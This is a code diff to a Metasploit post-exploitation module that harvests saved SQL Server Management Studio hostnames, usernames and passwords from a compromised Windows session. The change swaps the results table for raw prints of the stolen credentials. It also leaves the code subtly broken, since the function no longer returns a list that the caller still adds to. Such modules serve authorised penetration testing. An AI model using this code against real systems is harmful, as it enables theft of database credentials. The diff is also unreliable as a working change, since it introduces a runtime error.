@@ -69,7 +69,6 @@ class MetasploitModule < Msf::Post
   def pass; end
 
   def enum_session_file(fpath)
-    ssms_info = []
     account_paths = []
     print_status("Search session files on #{fpath}")
     if session.fs.file.exist?(fpath)
@@ -108,13 +107,13 @@ class MetasploitModule < Msf::Post
         end
         index += 1
       end
-      hostnames.each_with_index do |hostname, i|
-        host = hostname.split(',')[0]
-        port = hostname.split(',')[1] || 1433
-        ssms_info << { server: host, port: port, username: usernames[i], password: passwords[i] }
-      end
+      print_status('Hostname:')
+      print_good(hostnames.to_s)
+      print_status('Username:')
+      print_good(usernames.to_s)
+      print_status('Password:')
+      print_good(passwords.to_s)
     end
-    return ssms_info
   end
 
   def run
@@ -123,19 +122,5 @@ class MetasploitModule < Msf::Post
       results += enum_session_file(user_profiles['AppData'] + session.fs.file.separator + 'Microsoft\\SQL Server Management Studio\\')
       results += enum_session_file(user_profiles['AppData'] + session.fs.file.separator + 'Microsoft\\Microsoft SQL Server\\')
     end
-    columns = [
-      'HostName',
-      'Port',
-      'UserName',
-      'Password'
-    ]
-    tbl = Rex::Text::Table.new(
-      'Header' => 'SSMS Password',
-      'Columns' => columns
-    )
-    results.each do |item|
-      tbl << item.values
-    end
-    print_line(tbl.to_s)
   end
 end
